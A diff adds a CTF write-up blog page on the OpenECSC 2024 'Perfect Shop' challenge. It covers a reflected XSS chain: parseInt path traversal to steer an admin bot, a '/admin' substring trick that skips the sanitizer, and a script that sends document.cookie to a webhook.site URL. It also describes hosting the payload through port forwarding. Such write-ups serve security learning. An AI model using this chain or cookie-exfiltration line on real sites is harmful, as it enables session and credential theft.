@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Perfect Shop - OpenECSC 2024 | Tiziano Caruana</title>
+<meta name="keywords" content="writeup, CTFs, openecsc-2024">
+<meta name="description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/writeups/openecsc-2024/perfect_shop/">
+<meta name="google-site-verification" content="-NRlyU37XYTZJ4WyeO8svRuXL8xXbOUAqLrx-qYbEpw">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ&amp;usqp=CAU">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/writeups/openecsc-2024/perfect_shop/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Perfect Shop - OpenECSC 2024" />
+<meta property="og:description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/writeups/openecsc-2024/perfect_shop/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-27T22:20:00+02:00" />
+<meta property="article:modified_time" content="2024-03-27T22:20:00+02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Perfect Shop - OpenECSC 2024"/>
+<meta name="twitter:description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Perfect Shop - OpenECSC 2024",
+      "item": "http://localhost:1313/posts/writeups/openecsc-2024/perfect_shop/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Perfect Shop - OpenECSC 2024",
+  "name": "Perfect Shop - OpenECSC 2024",
+  "description": "Performing a static analysis only to find out that... the vulnerability is somewhere else!",
+  "keywords": [
+    "writeup", "CTFs", "openecsc-2024"
+  ],
+  "articleBody": "Perfect Shop March 2024 - filtered and size-limited reflected XSS\n“Do you like perfect things? Check out my new online shop!”\nPrior knowledge: HTML, JavaScript\nContext The link to the challenge website and its corresponding source code are provided. At first glance, the website may seem a bit overwhelming: there are various functionalities, which means several endpoints and mechanisms to study in search of vulnerabilities.\nHowever, fortunately, the code is relatively short and not very verbose, and all files except for server.js do not contain interesting elements: products.js gathers information about the products, while the various templates seem to only display elements passed by the server. Their presence can be kept in mind, but the existence of a Server Side Template Injection is temporarily ruled out.\nEven before the declaration of the endpoints, you can see the following code at the beginning of server.js:\nconst express = require('express'); const crypto = require('crypto'); const sanitizer = require(\"perfect-express-sanitizer\"); let products = require('./products'); const HEADLESS_HOST = process.env.HEADLESS_HOST || 'headless:5000'; const HEADLESS_AUTH = process.env.HEADLESS_AUTH || 'supersecret'; const WEB_DOM = process.env.WEB_DOM || 'web:3000'; const FLAG = process.env.FLAG || 'openECSC{this_is_a_fake_flag}'; const admin_password = crypto.randomBytes(20).toString('hex'); const app = express(); app.use(express.urlencoded({ extended: false })); app.set('view engine', 'ejs'); app.use(sanitizer.clean({ xss: true }, [\"/admin\"])); app.use((req, res, next) =\u003e { res.locals.errormsg = ''; res.locals.successmsg = ''; next(); }); It’s already possible to notice something interesting. The first half of the code does nothing but import libraries.\nKey Concepts for This Challenge I’ve decided to write down the key concepts necessary to solve the challenge so that the writeup can reach players who are not accustomed to the CTF context, given the nature of the competition. A CTF player and/or a programmer can directly read the summary of available information or a previous subsection that interests them.\nSending Information to the Server Starting from const app = express();, which confirms the use of express as the web framework of the site, the next line allows the programmer to access the data sent by users in POST requests as body parameters through req.body.[parameter].\nBody parameters are the information that the website receives without passing through either query parameters (in https://www.google.com/search?q=openECSC, q is the query parameter and openECSC is its value), or through headers including cookies. Typically, body parameters “pass” the information that the user enters in a form to the server, which handles it according to the programmer’s intentions.\nSummary: As you can see, it’s not mandatory for what the user sees and what is sent to the server to be the same. In this case, regarding the product, it’s much easier for the server to work with the id rather than the name, which in any case would still uniquely represent the selected product. It’s also fair to say that the programmer will access this information through the properties req.body.id and req.body.message.\nBasics of XSS Continuing, it’s noticeable that ejs is the chosen template engine for this app.\nMoving forward, the application is instructed to use perfect-express-sanitizer to avoid the risk of XSS (Cross-Site Scripting), except for the /admin endpoint. This type of attack is very straightforward: it occurs when a site can be manipulated to allow the execution of JavaScript code not explicitly written by the programmer. The most peculiar example is inserting a tag like this: . If this tag is inserted in a search page that prints what the user has searched for without any sanitization, the tag will be interpreted and the script executed:\nThis attack is “temporary”, only valid for the victim request, and it’s called reflected XSS. If the payload/attack vector (in this case ) had been somehow stored by the application, like, for example, in a comment, the attack would have been a stored XSS.\nHandling Request and Response in Express The last portion of code doesn’t show anything interesting. res.locals.errormsg and successmsg, if not null, appear as pop-ups containing useful information for the user (e.g., “search too long”).\nIt might be more useful to focus on the req and res parameters. These two parameters are present in all endpoints, and serve respectively to obtain information from and/or about the newly received request (req), and to “assign” information to the outgoing response, including those related to the aesthetics of the page.\nSummary of Available Information We know that the application sanitizes all inputs from XSS thanks to app.use(sanitizer.clean({ xss: true }, [\"/admin\"])); except for the /admin endpoint and that express is used as the web engine.\nEndpoints Although the “playing field” turned out to be less extensive than expected, there are several endpoints to analyze. Therefore, it’s important to understand their functionality from the beginning.\n/ (homepage) This is the first screen displayed when entering the site, or when a GET request is made to the / endpoint:\nThe related code is as follows:\napp.get('/', (req, res) =\u003e { res.render('products', { products: products }); }); Nothing interesting here: the template responsible for displaying a list of certain products, as shown in the screenshot, is rendered.\nIn particular, res.render() is a function that calls a certain template (first parameter) and passes it some information (second parameter). The template is responsible for displaying the information related to all entities passed as the second parameter in a generally ordered and aesthetically pleasing manner.\nIn this case, no filter is applied to the products variable, so all products will be displayed.\n/product/:id The two colons preceding id indicate that it is a value that can be arbitrarily chosen by the user. One can imagine that there are various products, and this is a way to allow for a route for each of them without explicitly specifying one for each.\napp.get('/product/:id', (req, res) =\u003e { const id = parseInt(req.params.id); if (isNaN(id) || id \u003c 0 || id \u003e= products.length) { res.status(404).send('Not found'); return; } res.render('product', { product: products[id] }); }); Here, the value entered by the user as the id is parsed as an integer and assigned to the variable with the same name (i.e., ensuring that the value is actually an integer, and when it is not, it is transformed into an integer according to certain criteria).\nIf the id is not recognized (the product does not exist), a 404 “not found” error is returned; otherwise, a template is rendered that returns a result similar to the one shown in the photo for the chosen product.\n/search A classic search functionality that filters results based on the product name.\napp.get('/search', (req, res) =\u003e { let query = req.query.q || ''; if (query.length \u003e 50) { res.locals.errormsg = 'Search query is too long'; query = ''; } const result = products.filter(product =\u003e product.name.toLowerCase().includes(query.toLowerCase())); res.render('search', { products: result, query: query }); }); If the search string passed as a query parameter is empty, the query variable is assigned an empty string. This also happens when the search string is too long, exceeding 50 characters.\nThen, a case-insensitive filter is applied based on the product name: if the searched string is not found in the product name, then that product is not included among the products to render. As you can see by trying to use the endpoint and by inferring from the rendering line, the query will also be returned as output after performing the search in addition to the found products.\nThis would be very useful for a simple reflected XSS, but the length filter and especially the omnipresent sanitization do not allow it. Too bad 😔\n/admin An admin panel with a list of all available products.\napp.get('/admin', (req, res) =\u003e { res.render('admin', { products: products }); }); The XSS filter on this route is disabled, yet there are no traces of HTML tags or similar.\n/admin/:id GET Product editing page, part of the admin panel.\napp.get('/admin/:id', (req, res) =\u003e { const id = parseInt(req.params.id); if (isNaN(id) || id \u003c 0 || id \u003e= products.length) { res.status(404).send('Not found'); return; } res.render('edit_product', { product: products[id] }); }); The code is practically identical to that of the search route. It serves to identify the product that the admin wishes to modify.\nAlready here we could pose a huge question ;)\nPOST Product modification action by the admin.\napp.post('/admin/:id', (req, res) =\u003e { const id = parseInt(req.params.id); if (isNaN(id) || id \u003c 0 || id \u003e= products.length) { res.status(404).send('Not found'); return; } if (req.body.password !== admin_password) { res.locals.errormsg = 'Invalid password'; res.render('edit_product', { product: products[id] }); return; } if (req.body.name) { products[id].name = req.body.name; } if (req.body.description) { products[id].description = req.body.description; } const price = parseFloat(req.body.price); if (!isNaN(price) \u0026\u0026 price \u003e= 0) { products[id].price = req.body.price; } res.locals.successmsg = 'Product updated successfully'; res.render('edit_product', { product: products[id] }); }); Given the password check, which is generated completely randomly, we could even ignore the code, as this is an endpoint impossible to trigger for regular users. The fact that the challenge is on a shared instance (all participants must solve the challenge on the same server) is already a big hint that we cannot modify the products as we please, potentially harming other participants. Imagine if someone could have the idea of giving RCE or this type of XSS on a shared instance :D\nFor completeness: the id passed by the user is parsed into id. A check is made on the existence of the product and on the correctness of the password. If both pass, all fields that are not empty on the edit page are modified, and also the price if the integrity check is passed (it simply checks that the price is a valid non-negative float). If the modification is successful, a success message is displayed, and in any case, at the end, you are redirected to the edit page.\nReport GET Simply renders the report page.\napp.get('/report', (req, res) =\u003e { res.render('report', { products: products }); }); It’s possible to see how the list of products serves the report page to allow the user to choose the product for which to file a complaint in the drop-down list.\nPOST User reporting action.\napp.post('/report', (req, res) =\u003e { const id = parseInt(req.body.id); if (isNaN(id) || id \u003c 0 || id \u003e= products.length) { res.locals.errormsg = 'Invalid product ID'; res.render('report', { products: products }); return; } fetch(`http://${HEADLESS_HOST}/`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH }, body: JSON.stringify({ actions: [ { type: 'request', url: `http://${WEB_DOM}/`, }, { type: 'set-cookie', name: 'flag', value: FLAG }, { type: 'request', url: `http://${WEB_DOM}/product/${req.body.id}` }, { \"type\": \"sleep\", \"time\": 1 } ] }) }).then((r) =\u003e { if (r.status !== 200) { res.locals.errormsg = 'Report submission failed, contact an admin if the problem persists'; } else { res.locals.successmsg = 'Report submitted successfully'; } res.render('report', { products: products }); }).catch(() =\u003e { res.locals.errormsg = 'Failed to submit report, contact an admin if the problem persists'; res.render('report', { products: products }); }); }); Headless Bot Verification At the outset, after parsing and checking the existence of the product as seen before, a fetch to a headless is performed.\nWhile this might seem overwhelming, the functioning of the headless is straightforward:\nThe fetch visits the site indicated in the constant HEADLESS_HOST, which cannot be known unless the application’s configurations are known.\nAt this address, a POST is made, with headers indicating to the headless that it is about to receive data in JSON format.\nSince the source code of the headless is not available, the exact mechanism behind the implementation of actions cannot be determined precisely. However, it is sufficient to know that there are instructions being executed sequentially, for the scope of the challenge.\nThe succession of actions is as follows:\nA GET request is made to the Perfect Shop, to allow the next step; A flag cookie related to the Perfect Shop is set, with the value being the flag to be extracted to solve the challenge; A GET request is made to http://${WEB_DOM}/product/${req.body.id}, where WEB_DOM is the address of the Perfect Shop, and req.body.id is the id passed by the user during the reporting process; Nothing is done for one second. After this, various error and success cases are handled. Two different messages are printed based on whether the error is detected by the challenge server’s JavaScript code, or if a status code other than 200 is returned by the headless.\nIn essence, the user’s report is being verified by a bot, simulating the behavior of a logged-in admin who presumably has session/authentication cookies related to the Shop and who checks the product with the id indicated by the user at the time of the report.\nSetup Having the challenge running locally greatly facilitates the process of understanding every tiny part of the application being attacked. In this case, the organizers have also delivered the source code with well-crafted Docker Compose files that allow setting up the infrastructure in a breeze.\nDocker Docker enables the creation of “magic boxes” (containers) containing certain software that can be executed as if it were running on the developer’s computer.\nThis means that developers can distribute infrastructures based on specific operating systems and configurations without requiring users to switch to such OS or modify their configurations.\nDocker Compose An application might require multiple containers, envisioning a site with a dedicated server for the web engine and another for the database (as in this challenge).\nDocker Compose files are like maps that aid in the coordinated management of different logically linked containers. They specify which containers need to be started simultaneously with a single command, along with information about them such as the values of their environment variables, the ports they can use, their dependencies, etc.\nReceiving well-crafted Docker Compose files along with the source code of the challenge means being able to easily test locally with a single command and modify the code as needed to better understand the limits of our payloads and the nature of the vulnerabilities of the site being attacked.\nThis Challenge Linux To simply run the challenge, just execute sudo docker compose up in the challenge folder to start all the containers. As indicated in both server.js and the docker-compose.yaml file, the site will be accessible on port 3000.\nIf for any reason you need to modify the source code of the challenge, simply make the desired changes, save the file, and then run sudo docker compose build web. In this case, specifying web indicates that only the container related to the web server should be rebuilt, rather than all containers.\nWindows Start the Docker Engine. If you have Docker Desktop, simply launch it, and the Engine will start automatically. From the terminal, navigate to the Perfect Shop folder and execute docker compose up to start the challenge locally, and docker compose build web if you wish to apply any changes. Similarly, specifying web indicates that only the container related to the web server should be rebuilt, rather than all containers.\nHow to Attack? The presence of a bot effectively guarantees that we’ll need to exploit a client-side vulnerability, as clearly confirmed by the presence of an XSS filter.\nThere are three things that might raise eyebrows when conducting a static code analysis (I didn’t notice two of these during the competition):\nThe entire input is being parsed and not casted, which means the parsed value and the unparsed value could be logically very different; The only endpoint exempt from input sanitization is /admin, but some HTML tags could also be found in /admin/:id (they are different endpoints); During the reporting phase, the report itself is related to the product with the parsed ID passed by the user, but the bot visits the product endpoint with the unparsed ID passed by the user. Connecting back to the first point, the values could be completely different from each other; Parsing The ID is parsed using the parseInt() function. As stated in the documentation, the only requirement for a string to be parsed as an integer is that it starts with a digit. But what happens if a string starts with a digit but contains other characters and symbols?\nThe console of major browsers’ DevTools is a great friend in this type of challenge. It can usually be accessed with fn+F12 \u003e console\nHell yeah.\nSimply put, the rest of the string is brutally truncated. The same goes if there are digits before, then characters, and then more digits. From the first encountered character onwards, everything is completely ignored by parseInt.\nEndpoint inheritance???? (It’s not a real thing don’t look it up) As visible from the screenshot shown earlier, there are tags in /admin/:id, despite only /admin being excluded from sanitization. At this point, the only option is to delve into the sanitizer’s workings, which in this case is imported from the perfect-express-sanitizer library. Specifically, in the challenge, version 1.0.13 was being used.\nThere are several modules related to sanitization, while index.js is the file responsible for managing the whitelist:\nconst sanitize = require(\"./modules/\"); function middleware( options = {}, whiteList = [], only = [\"body\", \"params\", \"headers\", \"query\"] ) { return (req, res, next) =\u003e { only.forEach((k) =\u003e { if (req[k] \u0026\u0026 !whiteList.some((v) =\u003e req.url.trim().includes(v))) { req[k] = sanitize.prepareSanitize(req[k], options); } }); next(); }; } module.exports = { clean: middleware, sanitize, }; The portion of code responsible for managing the whitelist is present in the if statement: !whiteList.some((v) =\u003e req.url.trim().includes(v)). The sanitization inside the if statement is only executed if the URL passed in the request does not include elements present in the whitelist. In particular, the use of some() allows checking if even a single element of the whitelist is present in the URL, in which case the condition becomes true, while trim() removes any spaces present at the beginning and end of the request URL.\nThis means that just as /admin is excluded from sanitization, so is /admin/:id.\nIt’s quiz time!!! From which of these elements can a URL be composed?\nhost path querystring (query parameters) all of the above Correct answer! You’re really good ^^\nArmed with this information, we can move on to the next point.\nTraveling Bot Yes, there is a discrepancy between the parsed id and the id of the product that will be visited by the bot, but what does it change for us? Leading the bot to http://perfectshop.challs.open.ecsc2024.it/product/1hehJHAHajhajseheja instead of http://perfectshop.challs.open.ecsc2024.it/product/1 as expected can be amusing, but nothing more.\nThere is a powerful weapon that can be used in these cases, namely ../, which in a path means “go up one folder”. The same can apply to an endpoint: http://perfectshop.challs.open.ecsc2024.it is equivalent to http://perfectshop.challs.open.ecsc2024.it/product/1/../../ (if the concept is not clear, I suggest playing around with it).\nThis means that we can send the bot around. In itself, it’s not a big deal, but by combining this with the other points mentioned, it’s already possible to imagine a chain to create a working exploit, at least on paper. If that’s not the case, you’re just like me, and it might be useful to proceed by reading…\nStudying the target by playing around Fuzzing is the art of experimenting and finding out, a technique proven by numerous cybersecurity experts, papers on the subject, and CTFers.\nTogether with desperation, food, and time constraints, it has been the most useful thing for solving this challenge.\nJokes aside, initially, I didn’t notice almost anything of what I’ve written so far in this writeup, and knowing my tendency to quickly abandon a challenge that I initially define as “difficult”, I decided to try a new approach.\nI tend to overlook various things during the exploration of a challenge, so having access to the source code and the Dockerfile, I decided to disable all filters and gradually re-enable them as I adapted the payload to the various constraints imposed on me.\nFirst step: Reflected XSS without filters In the server.js file, I edited the following lines:\nI decided to maintain decency on the length filter to avoid ending up with comically long payloads.\nAt this point, all that’s left is to build and deploy the challenge and see how it goes.\nAs expected, with the filters disabled, we can successfully exploit it. And steal a cookie?\nCookie stealing and webhooks Cookies are a special type of header, and for this reason, there’s a kind of shortcut in JavaScript that allows accessing them, namely the document.cookie property.\nTo successfully exfiltrate a user’s cookies on the website, you need an endpoint reachable by the victim, which means exposing a server to make it accessible to anyone.\nWebhooks are… versatile things. For this challenge, a website like webhook.site allows using them as if you were using your own server exposed to the outside world.\nFor a test, you can use a payload like this: In this type of payload, it’s important not to use a random HTML tag, but to ensure that JavaScript code is actually executed (it’s okay to insert the webhook URL concatenated with document.cookie inside an onerror, but not in a simple src) so that document.cookie is “reachable”.\nAlso, you need to append the cookies as query parameters (for webhook and personal server) or as a path (for a personal server only). Failing to do so means appending the cookies as part of the host, which means the request will never reach the desired destination. For example, instead of ending up at myhost.com, it would end up at myhost.comCOOKIENAME=COOKIEVALUE, which makes no sense, unlike myhost.com?c=COOKIENAME=COOKIEVALUE or myhost.com/COOKIENAME=COOKIEVALUE (which doesn’t make sense with webhook.site, unless you own that domain).\nExecuting the payload above by sending it to the search page yields the following result on webhook.site:\nThere are the cookies!\nSecond step: Cookie stealing on the bot Perhaps it would have made more sense to find a valid payload with the character filter first, but during the competition, I was a bit panicked and wanted to make sure I could steal the bot’s cookies without problems. Unfounded fear, as there was no kind of control in this regard, and the value of httpOnly for the flag cookie wasn’t specified, which means it will be set to the default value of false.\nWhat does this mean? For security reasons, the optional httpOnly flag was introduced for cookies, which if set to true, prevents JavaScript code in the document from accessing document.cookie, mitigating exactly the type of attack I’m about to perform.\nBut first, let’s delve into the bot’s operation and the related report page.\nAll fine, here’s the ID and the message. Checking the logs, which appear on the terminal from which the docker compose was launched, it’s also possible to verify which page was visited by the bot:\nAnd if, for no reason, you wanted to send an ID different from those prefixed by the select proposed by the developer? In this case, it’s very useful to modify the request with Burp Suite or similar tools. Unfortunately, I don’t have the time to show you how to set up Burp on your trusted browser (this tutorial may be helpful) or to show you the process to solve the challenge without using similar tools.\nWhat I did was change the value of id from 1 to 1/../../search?q=Incredible before it was sent to the server and consequently to the bot. To clarify, I would have achieved the same result if I had done this:\nChecking the logs, it can be seen that the bot is redirected to search?q=Incredible:\nA brief check of the site’s route structure confirms this.\nNow all that’s left is to try the payload that worked before to exfiltrate our cookie on the bot. Trying the payload , you would notice that the complete URL being visited is http://localhost:3000/search?q= or http://perfectshop.challs.open.ecsc2024.it/search?q= depending on whether you are testing the challenge locally or on the competition server.\nThis means that the same request must be made by the bot, which means making the same modification made before, combining it with the exploit already used:\nOf course, I’m not URL-encoding the payload here just to make it easier to understand what’s happening, but you viewers at home must remember to URL-encode properly \u003c3 (on Burp, CTRL+U highlighting the text to be URL-encoded):\nFirst, URL-encode for the query parameter value that the bot will send to the search endpoint, and then URL-encode for the entire payload that is about to be sent to the bot.\nSending this payload, you’ll receive a request on the webhook with the test flag set in the config:\nThird step: Cookie stealing on the bot with the sanitizer active On line 16, let’s modify the sanitizer again to set it as in the original application, then rebuild everything:\napp.use(sanitizer.clean({ xss: true }, [\"/admin\"]));\nOnce the application is rebuilt, you’ll notice that none of the payloads used previously will work anymore, being replaced instead by an empty string.\nIn this step, there are very few tricks that can be done. To solve this problem, one had to notice the error present in the sanitizer library, and during the competition, it was a far-from-immediate step.\nLet’s say that for any reason, whether you tried to enter an /admin in the request as a query parameter, or during static analysis, you noticed that something was wrong with the sanitizer, now it’s known that if /admin is a substring of the request URL (remember once again: query parameters are part of the URL), it will cause the sanitizer to ignore any type of XSS payload that is sent.\nOne very convenient thing is that if you decide to insert an unused query parameter in the request, it will simply be sent to the server and not used. This means that you can send a completely random parameter with the value /admin to skip any kind of sanitization without having to modify the payload in some convoluted way.\nSo, if before in the reporting phase you sent id=1/../../search?q=\u0026message=openECSC, now you can send something similar to id=1/../../search?lol=/admin\u0026q=\u0026message=/admin.\nNote how I had to use one /admin to bypass the filter when communicating with the bot and another to bypass the filter when tricking the bot into performing a search in the related endpoint.\nOf course, starting such a chain (?) means properly handling URL encoding to ensure that the parameters are correctly spread between the POST made to the report endpoint (to which the parameters id and message will be sent) and the request made by the bot to the search endpoint (to which the necessary parameter search and the dummy parameter lol will be sent).\nOnce the URL encoding is correctly applied, the result should be this: id=1/../../search%3flol%3d\"/admin\"%26q%3d\u0026message=/admin.\nSince it’s not excluded by the filter, it will be necessary to bypass the filter also in the report endpoint. To do this, simply add any query parameter with the value /admin or '/admin' in the report URL. In Burp Suite, the final payload will be:\nBy doing this, you should again get the flag on the webhook as before. Now there’s one last obstacle to overcome…\nLast Step: Length Filter Bypass This step didn’t require any rocket science. Let’s say I simply aimed to find the shortest possible payload with the same philosophy as the previous ones. For completeness, I’ll add a subsection with the various things I tried during the competition.\nWhat I Tried During the Competition First of all, I tried several times to exploit unicode normalization, with a payload like , so that it included the file from my server, executed it, and sent me the flag by changing the page’s address from that of the challenge to that of my webhook, including the cookie parameters related to the challenge site as query parameters.\nHow to expose your server to the world To expose your files to the rest of the internet, you don’t need to physically own a server. Your PC can serve this purpose without much trouble. All you need is Python to do what I did during the competition, so I believe any operating system that supports Python also allows you to expose a server as I’m about to show:\nFirstly, you need to get your local IP, which on Linux you can obtain by running the command ifconfig:\nYou will likely see an IP starting with 192.; here, I tested it on my university’s MAN.\nThen, to expose the file containing the payload to the local network, you can use the Python command python3 -m http.server [PORT]. This command sets up a simple HTTP server that exposes all files in the folder and its subfolders where the command was executed. This means that at the URL http://[IP]:[PORT]/x.js, if everything is set up correctly, you should find the payload.\nOpening it, you should be able to see the payload, which is not being executed. Do not be afraid; when this is included in the script tag, it will be executed as necessary.\nAs all good kids know, it’s the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router. To find out what your external IP address is, you can use an online service like whatismyip.com.\nAt this point, we have almost everything: we know the IP address where the file to be included in the script tag passed to the bot will be located (i.e., the IP we just found), and we know the port on our device where our files are exposed (after all, we chose it).\nBut there’s one step missing: the router is reachable from the outside world, but the server hosted on the device is only reachable within the local network. Somehow, we need to tell the router that when a request is received on a certain port, that request should be handled by the Python server.\nPort forwarding allows us to do this. The procedure for enabling it varies greatly depending on the router manufacturer.\nAs for the protocol, it’s important to select TCP/UDP or similar if available; otherwise, it’s better to create a port forwarding table for each protocol.\nThe WAN port is the port that will be reachable from the outside, while the LAN port is the port that will receive packets from the outside. Essentially, it’s the one chosen when the HTTP server was set up in Python. To avoid errors, I would recommend using the same LAN and WAN port (internal and external) where possible.\nThe destination IP is the local IP of the device used, i.e., the one I obtained with ifconfig, or ipconfig in Windows.\nThis way, when the router receives a request on the selected WAN port, the packet will be forwarded to the local IP and port entered in the port forwarding table.\nTo test that everything has been done correctly, simply visit [public IP of the router]:[WAN port] from any device, preferably not connected to the same local network as the server hosting the exploit (e.g., a phone with mobile data).\nFinal Payload Let’s make it happen.\nTo recap:\nThe finalized payload to include the remote JavaScript code is . The code present on x.js is window.location = \"https://webhook.site/[REDACTED]?c=\" + document.cookie;. All that’s left is to send the bot a report like this: id=1/../../search%3flol%3d\"/admin\"%26q%3d",
+  "wordCount" : "5526",
+  "inLanguage": "en",
+  "datePublished": "2024-03-27T22:20:00+02:00",
+  "dateModified": "2024-03-27T22:20:00+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/writeups/openecsc-2024/perfect_shop/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Tiziano Caruana",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ\u0026usqp=CAU"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Tiziano Caruana (Alt + H)">Tiziano Caruana</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="http://localhost:1313/it/" title="Italiano"
+                            aria-label="Italiano">Italiano</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about_me" title="About me">
+                    <span>About me</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/writeup" title="Writeup">
+                    <span>Writeup</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Perfect Shop - OpenECSC 2024
+    </h1>
+    <div class="post-description">
+      Performing a static analysis only to find out that... the vulnerability is somewhere else!
+    </div>
+    <div class="post-meta"><span title='2024-03-27 22:20:00 +0200 +0200'>March 27, 2024</span>&nbsp;·&nbsp;26 min&nbsp;·&nbsp;5526 words
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#perfect-shop" aria-label="Perfect Shop">Perfect Shop</a><ul>
+                        
+                <li>
+                    <a href="#context" aria-label="Context">Context</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#key-concepts-for-this-challenge" aria-label="Key Concepts for This Challenge">Key Concepts for This Challenge</a><ul>
+                        
+                <li>
+                    <a href="#sending-information-to-the-server" aria-label="Sending Information to the Server">Sending Information to the Server</a></li>
+                <li>
+                    <a href="#basics-of-xss" aria-label="Basics of XSS">Basics of XSS</a></li>
+                <li>
+                    <a href="#handling-request-and-response-in-express" aria-label="Handling Request and Response in Express">Handling Request and Response in Express</a></li>
+                <li>
+                    <a href="#summary-of-available-information" aria-label="Summary of Available Information">Summary of Available Information</a></li></ul>
+                </li></ul>
+                    
+                <li>
+                    <a href="#endpoints" aria-label="Endpoints">Endpoints</a><ul>
+                        
+                <li>
+                    <a href="#-homepage" aria-label="/ (homepage)">/ (homepage)</a></li>
+                <li>
